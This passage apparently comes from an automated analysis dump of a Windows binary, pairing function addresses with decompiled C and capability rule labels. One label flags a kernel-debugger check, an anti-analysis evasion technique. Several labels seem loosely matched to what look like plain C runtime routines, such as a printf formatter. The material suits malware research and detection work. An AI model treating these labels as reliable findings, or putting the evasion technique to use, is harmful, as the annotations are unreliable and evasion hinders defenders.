(*(uVar4 + 8) == 0) {\n                        fcn.00415f91(10);\n                        *(unaff_EBP + -4) = 1;\n                        if (*(uVar4 + 8) == 0) {\n                            iVar2 = fcn.0041f08d(uVar4 + 0xc, 4000);\n                            if (iVar2 == 0) {\n                                *(unaff_EBP + -0x24) = 1;\n                            }\n                            else {\n                                *(uVar4 + 8) = *(uVar4 + 8) + 1;\n                            }\n                        }\n                        *(unaff_EBP + -4) = 0;\n                        fcn.004223a4();\n                    }\n                    if (*(unaff_EBP + -0x24) == 0) {\n                        func_0x004bc9f8(uVar4 + 0xc);\n                        return;\n                    }\n                }\n            }\n            if (*(unaff_EBP + -0x1c) != -1) break;\n        }\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00422462();\n    }\n    fcn.0041471d();\n    return;\n}\n",
        "token_count": 936
    },
    "00423ff2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00423ff2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435b90 ^ &stack0xfffffffc;\n    fcn.0041102a(arg_10h);\n    var_14h = fcn.00425b9e(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00425116(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0042404b:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0042408b;\n        }\n        if (iVar1 != 2) {\ncode_r0x0042407d:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0042408b;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0042407d;\n        goto code_r0x0042404b;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0042408b:\n    fcn.00410f95(unaff_EBX);\n    return;\n}\n",
        "token_count": 503
    },
    "0042409a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042409a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435b90 ^ &stack0xfffffffc;\n    fcn.0041102a(arg_10h);\n    var_14h = fcn.00425b9e(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0042565a(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x004240f3:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00424133;\n        }\n        if (iVar1 != 2) {\ncode_r0x00424125:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00424133;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00424125;\n        goto code_r0x004240f3;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00424133:\n    fcn.00410f95(unaff_EBX);\n    return;\n}\n",
        "token_count": 499
    },
    "00424c64": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00424c64(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004146d8(0x4331e8, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.004125f1();\n        *puVar2 = 0;\n        puVar2 = fcn.004125de();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x439dc0)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x439de0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0042220a(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004125de();\n                    *puVar2 = 9;\n                    puVar2 = fcn.004125f1();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00424bef(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00424d36(0x4331e8);\n                goto code_r0x00424d30;\n            }\n        }\n        puVar2 = fcn.004125f1();\n        *puVar2 = 0;\n        puVar2 = fcn.004125de();\n        *puVar2 = 9;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n    }\ncode_r0x00424d30:\n    fcn.0041471d();\n    return;\n}\n",
        "token_count": 631
    },
    "00429a2a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00429a2a(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint arg_18h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = arg_ch;\n    if (arg_ch == NULL) {\n        iVar2 = fcn.00420ab4();\n        var_ch = *(iVar2 + 8);\n        iVar2 = fcn.00420a8e();\n    }\n    else {\n        var_ch = *arg_ch;\n        iVar2 = arg_ch[1];\n    }\n    if (var_ch == 0) {\n        if (0x19 < arg_8h - 0x61) {\n            return arg_8h;\n        }\n        return arg_8h - 0x20;\n    }\n    if (arg_8h < 0x100) {\n        if (piVar1 != NULL) {\n            if ((*(piVar1[2] + arg_8h * 2) & 2) == 0) {\n                return arg_8h;\n            }\n            goto code_r0x00429aa1;\n        }\n        iVar3 = fcn.00423c45(arg_8h);\n        if (iVar3 == 0) {\n            return arg_8h;\n        }\n    }\n    else {\ncode_r0x00429aa1:\n        if (piVar1 != NULL) {\n            uVar4 = *(piVar1[2] + (arg_8h >> 8 & 0xffU) * 2) >> 0xf & 1;\n            goto code_r0x00429adc;\n        }\n    }\n    iVar3 = fcn.0041fb37();\n    uVar4 = *(iVar3 + (arg_8h >> 8 & 0xffU) * 2) & 0x8000;\ncode_r0x00429adc:\n    if (uVar4 == 0) {\n        arg_ch = arg_ch & 0xffff0000 | arg_8h & 0xff;\n        arg_18h = 1;\n    }\n    else {\n        arg_ch = arg_ch & 0xff000000 | CONCAT11(arg_8h, arg_8h >> 8);\n        arg_18h = 2;\n    }\n    iVar2 = fcn.0041f8f6(0, var_ch, 0x200, &arg_ch, arg_18h, &var_4h, 3, iVar2, 1);\n    if ((iVar2 != 0) && (arg_8h = var_4h,  iVar2 != 1)) {\n        arg_8h = CONCAT11(var_4h, var_4h._1_1_);\n    }\n    return arg_8h;\n}\n",
        "token_count": 670
    },
    "00444cf0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444cf0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x45c380;\n    fcn.0044d924(in_ECX[0x201]);\n    if ((arg_8h & 1) != 0) {\n        fcn.0044d92f();\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "00445020": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445020(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x45c380;\n    fcn.0044d924(in_ECX[0x201]);\n    if ((arg_8h & 1) != 0) {\n        fcn.0044d92f();\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "004456b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004456b0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x45c380;\n    fcn.0044d924(in_ECX[0x201]);\n    if ((arg_8h & 1) != 0) {\n        fcn.0044d92f();\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "004461c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004461c0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x45a20c;\n    fcn.0044e742();\n    if ((arg_8h & 1) != 0) {\n        fcn.0044d92f();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0044db80": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044db80(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_ch;\n    \n    do {\n        iVar2 = fcn.00450a2f(arg_8h);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00450b08(arg_8h);\n    } while (iVar2 != 0);\n    if ((*0x46246c & 1) == 0) {\n        *0x46246c = *0x46246c | 1;\n        fcn.0044db65();\n        fcn.004509c9(0x4598f2);\n    }\n    fcn.004461a0(0x462460);\n    fcn.0044f098(&var_ch, 0x45d208);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 214
    },
    "0044d53a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d53a(uint32_t arg_8h)\n\n{\n    fcn.0044d51b();\n    if ((arg_8h & 1) != 0) {\n        fcn.0044d92f();\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "0044d583": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d583(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x45a224;\n    fcn.0044d51b();\n    if ((arg_8h & 1) != 0) {\n        fcn.0044d92f();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0044d5d2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d5d2(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x45a230;\n    fcn.0044d51b();\n    if ((arg_8h & 1) != 0) {\n        fcn.0044d92f();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "0044e765": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044e765(uint32_t arg_8h)\n\n{\n    fcn.0044e742();\n    if ((arg_8h & 1) != 0) {\n        fcn.0044d92f();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "0044e796": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044e796(uint32_t arg_8h)\n\n{\n    fcn.0044e786();\n    if ((arg_8h & 1) != 0) {\n        fcn.0044d92f();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "0044f685": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0044f685(void)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar uVar5;\n    char cVar6;\n    uint8_t *puVar7;\n    int32_t unaff_ESI;\n    uint *arg_8h;\n    uint var_51ch;\n    uint var_518h;\n    uint var_512h;\n    uint var_504h;\n    uint var_304h;\n    uint var_204h;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    var_4h = *0x45f8b4 ^ &stack0xfffffffc;\n    arg_8h = &var_518h;\n    iVar3 = func_0x005ffe60();\n    if (iVar3 == 0) {\n        uVar4 = 0;\n        do {\n            pcVar1 = unaff_ESI + 0x11d + uVar4;\n            if (pcVar1 + (-0x61 - (unaff_ESI + 0x11d)) + 0x20 < 0x1a) {\n                puVar7 = unaff_ESI + 0x1d + uVar4;\n                *puVar7 = *puVar7 | 0x10;\n                cVar6 = uVar4 + ' ';\ncode_r0x0044f7fe:\n                *pcVar1 = cVar6;\n            }\n            else {\n                if (pcVar1 + (-0x61 - (unaff_ESI + 0x11d)) < 0x1a) {\n                    puVar7 = unaff_ESI + 0x1d + uVar4;\n                    *puVar7 = *puVar7 | 0x20;\n                    cVar6 = uVar4 + -0x20;\n                    goto code_r0x0044f7fe;\n                }\n                *pcVar1 = '\\0';\n            }\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 0x100);\n    }\n    else {\n        uVar4 = 0;\n        do {\n            *(&var_104h + uVar4) = uVar4;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 0x100);\n        var_104h._0_1_ = 0x20;\n        if (var_512h != 0) {\n            puVar7 = &var_512h + 1;\n            do {\n                uVar4 = var_512h;\n                if (uVar4 <= *puVar7) {\n                    fcn.00452080(&var_104h + uVar4, 0x20, (*puVar7 - uVar4) + 1);\n                }\n                var_512h._0_1_ = puVar7[1];\n                puVar7 = puVar7 + 2;\n            } while (var_512h != 0);\n        }\n        fcn.0045557f(0, 1, &var_104h, 0x100, &var_504h, *(unaff_ESI + 4), *(unaff_ESI + 0xc), 0);\n        fcn.00451fe5(0, *(unaff_ESI + 0xc), 0x100, &var_104h, 0x100, &var_204h, 0x100, *(unaff_ESI + 4), 0);\n        fcn.00451fe5(0, *(unaff_ESI + 0xc), 0x200, &var_104h, 0x100, &var_304h, 0x100, *(unaff_ESI + 4), 0);\n        uVar4 = 0;\n        do {\n            uVar2 = *(&var_504h + uVar4 * 2);\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 & 2) != 0) {\n                    puVar7 = unaff_ESI + 0x1d + uVar4;\n                    *puVar7 = *puVar7 | 0x20;\n                    uVar5 = *(&var_304h + uVar4);\n                    goto code_r0x0044f79c;\n                }\n                *(unaff_ESI + 0x11d + uVar4) = 0;\n            }\n            else {\n                puVar7 = unaff_ESI + 0x1d + uVar4;\n                *puVar7 = *puVar7 | 0x10;\n                uVar5 = *(&var_204h + uVar4);\ncode_r0x0044f79c:\n                *(unaff_ESI + 0x11d + uVar4) = uVar5;\n            }\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 0x100);\n    }\n    fcn.0044f4d8(arg_8h);\n    return;\n}\n",
        "token_count": 1139
    },
    "00450fc8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00450fc8(int32_t arg_8h, uint16_t *arg_ch, uint arg_10h, int32_t **arg_14h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uint8_t *arg_ch_00;\n    int32_t **ppiVar7;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    uint8_t *puVar10;\n    uint16_t *puVar11;\n    bool bVar12;\n    int64_t iVar13;\n    uint *puVar14;\n    int32_t *piVar15;\n    uint uVar16;\n    uint var_470h;\n    int32_t *var_46ch;\n    int32_t *var_468h;\n    uint32_t var_464h;\n    uint16_t *var_460h;\n    uint var_45ch;\n    int32_t *var_458h;\n    int32_t var_454h;\n    int32_t var_450h;\n    int32_t var_44ch;\n    int32_t var_444h;\n    uint var_440h;\n    int32_t var_43ch;\n    uint var_438h;\n    uint32_t var_434h;\n    uint var_430h;\n    int32_t *var_42ch;\n    int32_t var_428h;\n    int32_t var_424h;\n    int32_t var_420h;\n    uint8_t *var_41ch;\n    int32_t **var_418h;\n    uint8_t *var_414h;\n    int32_t *var_410h;\n    int32_t *var_40ch;\n    uint32_t var_408h;\n    uint var_404h;\n    uint var_205h;\n    uint32_t var_4h;\n    \n    var_4h = *0x45f8b4 ^ &stack0xfffffffc;\n    var_43ch = arg_8h;\n    var_418h = arg_14h;\n    var_454h = 0;\n    var_408h = 0;\n    var_42ch = NULL;\n    var_40ch = NULL;\n    var_424h = 0;\n    var_450h = 0;\n    var_428h = 0;\n    fcn.0044d93a(arg_10h);\n    if (arg_8h == 0) {\ncode_r0x00451033:\n        puVar3 = fcn.00450859();\n        *puVar3 = 0x16;\n    }\n    else {\n        if (arg_ch != NULL) {\n            var_41ch = *arg_ch;\n            var_420h = 0;\n            var_414h = NULL;\n            var_434h = 0;\n            var_458h = NULL;\n            if (*arg_ch != 0) {\n                do {\n                    puVar11 = arg_ch + 1;\n                    var_460h = puVar11;\n                    if (var_420h < 0) break;\n                    iVar2 = var_41ch;\n                    if (iVar2 - 0x20U < 0x59) {\n                        uVar4 = var_41ch[0x45b3b8] & 0xf;\n                    }\n                    else {\n                        uVar4 = 0;\n                    }\n                    var_434h = *(uVar4 * 9 + 0x45b3d8 + var_434h) >> 4;\n                    ppiVar7 = var_418h;\n    // switch table (8 cases) at 0x451b48\n                    switch(var_434h) {\n                    case 0:\ncode_r0x00451318:\n                        var_428h = 1;\n                        fcn.00450f20(var_41ch);\n                        ppiVar7 = arg_14h;\n                        break;\n                    case 1:\n                        var_40ch = 0xffffffff;\n                        var_45ch = 0;\n                        var_450h = 0;\n                        var_42ch = NULL;\n                        var_424h = 0;\n                        var_408h = 0;\n                        var_428h = 0;\n                        ppiVar7 = arg_14h;\n                        break;\n                    case 2:\n                        if (var_41ch == 0x20) {\n                            var_408h = var_408h | 2;\n                            ppiVar7 = arg_14h;\n                        }\n                        else if (var_41ch == 0x23) {\n                            var_408h = var_408h | 0x80;\n                            ppiVar7 = arg_14h;\n                        }\n                        else if (var_41ch == 0x2b) {\n                            var_408h = var_408h | 1;\n                            ppiVar7 = arg_14h;\n                        }\n                        else if (var_41ch == 0x2d) {\n                            var_408h = var_408h | 4;\n                            ppiVar7 = arg_14h;\n                        }\n                        else if (var_41ch == 0x30) {\n                            var_408h = var_408h | 8;\n                            ppiVar7 = arg_14h;\n                        }\n                        break;\n                    case 3:\n                        if (iVar2 == 0x2a) {\n                            var_42ch = *arg_14h;\n                            var_418h = arg_14h + 1;\n                            ppiVar7 = var_418h;\n                            if (var_42ch < 0) {\n                                var_408h = var_408h | 4;\n                                var_42ch = -var_42ch;\n                            }\n                        }\n                        else {\n                            var_42ch = var_41ch + var_42ch * 10 + -0x30;\n                            ppiVar7 = arg_14h;\n                        }\n                        break;\n                    case 4:\n                        var_40ch = NULL;\n                        ppiVar7 = arg_14h;\n                        break;\n                    case 5:\n                        if (iVar2 == 0x2a) {\n                            var_40ch = *arg_14h;\n                            var_418h = arg_14h + 1;\n                            ppiVar7 = var_418h;\n                            if (var_40ch < 0) {\n                                var_40ch = 0xffffffff;\n                            }\n                        }\n                        else {\n                            var_40ch = var_41ch + var_40ch * 10 + -0x30;\n                            ppiVar7 = arg_14h;\n                        }\n                        break;\n                    case 6:\n                        if (var_41ch == 0x49) {\n                            uVar1 = *puVar11;\n                            if ((uVar1 == 0x36) && (arg_ch[2] == 0x34)) {\n                                var_408h = var_408h | 0x8000;\n                                ppiVar7 = arg_14h;\n                                puVar11 = arg_ch + 3;\n                            }\n                            else if ((uVar1 == 0x33) && (arg_ch[2] == 0x32)) {\n                                var_408h = var_408h & 0xffff7fff;\n                                ppiVar7 = arg_14h;\n                                puVar11 = arg_ch + 3;\n                            }\n                            else {\n                                ppiVar7 = arg_14h;\n                                if (((((uVar1 != 100) && (uVar1 != 0x69)) && (uVar1 != 0x6f)) &&\n                                    ((uVar1 != 0x75 && (uVar1 != 0x78)))) && (uVar1 != 0x58)) {\n                                    var_434h = 0;\n                                    goto code_r0x00451318;\n                                }\n                            }\n                        }\n                        else if (var_41ch == 0x68) {\n                            var_408h = var_408h | 0x20;\n                            ppiVar7 = arg_14h;\n                        }\n                        else if (var_41ch == 0x6c) {\n                            if (*puVar11 == 0x6c) {\n                                var_408h = var_408h | 0x1000;\n                                ppiVar7 = arg_14h;\n                                puVar11 = arg_ch + 2;\n                            }\n                            else {\n                                var_408h = var_408h | 0x10;\n                                ppiVar7 = arg_14h;\n                            }\n                        }\n                        else {\n                            ppiVar7 = arg_14h;\n                            if (var_41ch == 0x77) {\n                                var_408h = var_408h | 0x800;\n                            }\n                        }\n                        break;\n                    case 7:\n                        if (var_41ch < 0x65) {\n                            if (var_41ch == 0x64) {\ncode_r0x00451609:\n                                var_408h = var_408h | 0x40;\ncode_r0x00451610:\n                                var_41ch = 0xa;\ncode_r0x0045161a:\n                                if (((var_408h & 0x8000) == 0) && ((var_408h & 0x1000) == 0)) {\n                                    var_418h = arg_14h + 1;\n                                    if ((var_408h & 0x20) == 0) {\n                                        piVar9 = *arg_14h;\n                                        if ((var_408h & 0x40) == 0) {\n                                            piVar8 = NULL;\n                                        }\n                                        else {\n                                            piVar8 = piVar9 >> 0x1f;\n                                        }\n                                    }\n                                    else {\n                                        if ((var_408h & 0x40) == 0) {\n                                            piVar9 = *arg_14h;\n                                        }\n                                        else {\n                                            piVar9 = *arg_14h;\n                                        }\n                                        piVar8 = piVar9 >> 0x1f;\n                                    }\n                                }\n                                else {\n                                    var_418h = arg_14h + 2;\n                                    piVar9 = *arg_14h;\n                                    piVar8 = arg_14h[1];\n                                }\n                                if ((((var_408h & 0x40) != 0) && (piVar8 < 1)) && (piVar8 < 0)) {\n                                    bVar12 = piVar9 != NULL;\n                                    piVar9 = -piVar9;\n                                    piVar8 = -(piVar8 + bVar12);\n                                    var_408h = var_408h | 0x100;\n                                }\n                                if ((var_408h & 0x9000) == 0) {\n                                    piVar8 = NULL;\n                                }\n                                iVar13 = CONCAT44(piVar8, piVar9);\n                                if (var_40ch < 0) {\n                                    var_40ch = 0x1;\n                                }\n                                else {\n                                    var_408h = var_408h & 0xfffffff7;\n                                    if (0x200 < var_40ch) {\n                                        var_40ch = 0x200;\n                                    }\n                                }\n                                if ((piVar9 | piVar8) == 0) {\n                                    var_424h = 0;\n                                }\n                                piVar9 = &var_205h;\n                                while ((piVar8 = var_40ch + -1,  0 < var_40ch || (iVar13 != 0))) {\n                                    var_40ch = piVar8;\n                                    iVar13 = fcn.00456020();\n                                    iVar5 = extraout_ECX + 0x30;\n                                    if (0x39 < iVar5) {\n                                        iVar5 = iVar5 + var_454h;\n                                    }\n                                    *piVar9 = iVar5;\n                                    piVar9 = piVar9 + -1;\n                                }\n                                var_414h = &var_205h + -piVar9;\n                                var_410h = piVar9 + 1;\n                                var_40ch = piVar8;\n                                if (((var_408h & 0x200) != 0) && ((var_414h == NULL || (*var_410h != 0x30)))) {\n                                    *piVar9 = 0x30;\n                                    var_414h = &var_205h + -piVar9 + 1;\n                                    var_410h = piVar9;\n                                }\n                            }\n                            else if (var_41ch < 0x54) {\n                                if (var_41ch == 0x53) {\n                                    if ((var_408h & 0x830) == 0) {\n                                        var_408h = var_408h | 0x20;\n                                    }\n                                    goto code_r0x004513e8;\n                                }\n                                if (var_41ch != 0x41) {\n                                    if (var_41ch == 0x43) {\n                                        if ((var_408h & 0x830) == 0) {\n                                            var_408h = var_408h | 0x20;\n                                        }\ncode_r0x00451492:\n                                        uVar1 = *arg_14h;\n                                        var_464h = uVar1;\n                                        var_418h = arg_14h + 1;\n                                        var_428h = 1;\n                                        if ((var_408h & 0x20) == 0) {\n                                            var_404h._0_2_ = uVar1;\n                                        }\n                                        else {\n                                            var_438h._0_1_ = uVar1;\n                                            var_438h._1_1_ = 0;\n                                            iVar5 = fcn.00456eb4(&var_404h, &var_438h, *(var_44ch + 0xac), &var_44ch);\n                                            if (iVar5 < 0) {\n                                                var_450h = 1;\n                                            }\n                                        }\n                                        var_414h = 0x1;\n                                        var_410h = &var_404h;\n                                        goto code_r0x00451958;\n                                    }\n                                    if ((var_41ch != 0x45) && (var_41ch != 0x47)) goto code_r0x00451958;\n                                }\n                                var_41ch = var_41ch + 0x20;\n                                var_45ch = 1;\ncode_r0x0045137f:\n                                var_408h = var_408h | 0x40;\n                                var_414h = 0x200;\n                                piVar9 = &var_404h;\n                                puVar10 = var_414h;\n                                piVar8 = &var_404h;\n                                if (var_40ch < 0) {\n                                    var_40ch = 0x6;\n                                }\n                                else if (var_40ch == NULL) {\n                                    if (var_41ch == 0x67) {\n                                        var_40ch = 0x1;\n                                    }\n                                }\n                                else {\n                                    if (0x200 < var_40ch) {\n                                        var_40ch = 0x200;\n                                    }\n                                    if (0xa3 < var_40ch) {\n                                        puVar10 = var_40ch + 0x15d;\n                                        var_410h = &var_404h;\n                                        var_458h = fcn.004527cd(puVar10);\n                                        piVar9 = var_458h;\n                                        piVar8 = var_458h;\n                                        if (var_458h == NULL) {\n                                            var_40ch = 0xa3;\n                                            piVar9 = &var_404h;\n                                            puVar10 = var_414h;\n                                            piVar8 = var_410h;\n                                        }\n                                    }\n                                }\n                                var_410h = piVar8;\n                                var_414h = puVar10;\n                                var_46ch = *arg_14h;\n                                var_418h = arg_14h + 2;\n                                var_468h = arg_14h[1];\n                                puVar3 = &var_44ch;\n                                iVar5 = var_41ch;\n                                puVar14 = &var_46ch;\n                                piVar8 = piVar9;\n                                puVar10 = var_414h;\n                                piVar15 = var_40ch;\n                                uVar16 = var_45ch;\n                                pcVar6 = fcn.00450075(*0x45fe50);\n                                (*pcVar6)(puVar14, piVar8, puVar10, iVar5, piVar15, uVar16, puVar3);\n                                uVar4 = var_408h & 0x80;\n                                if ((uVar4 != 0) && (var_40ch == NULL)) {\n                                    puVar3 = &var_44ch;\n                                    piVar8 = piVar9;\n                                    pcVar6 = fcn.00450075(*0x45fe5c);\n                                    (*pcVar6)(piVar8, puVar3);\n                                }\n                                if ((var_41ch == 0x67) && (uVar4 == 0)) {\n                                    puVar3 = &var_44ch;\n                                    piVar8 = piVar9;\n                                    pcVar6 = fcn.00450075(*0x45fe58);\n                                    (*pcVar6)(piVar8, puVar3);\n                                }\n                                if (*piVar9 == 0x2d) {\n                                    var_408h = var_408h | 0x100;\n                                    piVar9 = piVar9 + 1;\n                                    var_410h = piVar9;\n                                }\ncode_r0x0045156b:\n                                var_414h = fcn.0044efb0(piVar9);\n                            }\n                            else {\n                                if (var_41ch == 0x58) goto code_r0x00451769;\n                                if (var_41ch == 0x5a) {\n                                    piVar9 = *arg_14h;\n                                    var_418h = arg_14h + 1;\n                                    if ((piVar9 == NULL) || (var_410h = piVar9[1],  var_410h == NULL)) {\n                                        var_410h = *0x45fe30;\n                                        piVar9 = *0x45fe30;\n                                        goto code_r0x0045156b;\n                                    }\n                                    var_414h = *piVar9;\n                                    if ((var_408h & 0x800) != 0) {\n                                        iVar5 = var_414h - (var_414h >> 0x1f);\n                                        goto code_r0x00451950;\n                                    }\n                                    var_428h = 0;\n                                }\n                                else {\n                                    if (var_41ch == 0x61) goto code_r0x0045137f;\n                                    if (var_41ch == 0x63) goto code_r0x00451492;\n                                }\n                            }\ncode_r0x00451958:\n                            puVar10 = var_414h;\n                            if (var_450h == 0) {\n                                if ((var_408h & 0x40) != 0) {\n                                    if ((var_408h & 0x100) == 0) {\n                                        if ((var_408h & 1) == 0) {\n                                            if ((var_408h & 2) == 0) goto code_r0x0045199a;\n                                            var_430h._0_2_ = 0x20;\n                                        }\n                                        else {\n                                            var_430h._0_2_ = 0x2b;\n                                        }\n                                    }\n                                    else {\n                                        var_430h._0_2_ = 0x2d;\n                                    }\n                                    var_424h = 1;\n                                }\ncode_r0x0045199a:\n                                arg_ch_00 = var_42ch + (-var_424h - var_414h);\n                                if ((var_408h & 0xc) == 0) {\n                                    fcn.00450f4f(0x20, arg_ch_00, var_43ch);\n                                }\n                                iVar5 = var_43ch;\n                                fcn.00450f76(var_424h);\n                                if (((var_408h & 8) != 0) && ((var_408h & 4) == 0)) {\n                                    fcn.00450f4f(0x30, arg_ch_00, iVar5);\n                                }\n                                if ((var_428h == 0) && (0 < puVar10)) {\n                                    var_41ch = puVar10;\n                                    piVar9 = var_410h;\n                                    do {\n                                        var_41ch 